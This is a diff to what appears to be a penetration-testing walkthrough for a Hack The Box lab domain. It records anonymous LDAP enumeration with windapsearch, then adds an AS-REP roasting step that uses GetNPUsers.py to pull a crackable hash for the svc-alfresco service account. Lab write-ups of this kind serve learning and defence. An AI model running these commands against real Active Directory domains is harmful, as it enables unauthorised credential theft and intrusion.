@@ -29,9 +29,14 @@ windapsearch --dc-ip $IP -u "" -U | tee windasearch-users.log
 windapsearch --dc-ip $IP -u "" --custom "ObjectClass=*" | tee windasearch-objects.log
 ```
 
-__Findings__
 - Found: _svc-alfresco_ service account
 - Found: 5 domain users
+
+##### Asreproasting
+```bash
+GetNPUsers.py -dc-ip $IP -usersfile domain-users.txt -request -format hashcat -outputfile asreprost.out HTB.local/
+```
+- Got _TGT_ for _svc-alfresco_ service account
 
 
 
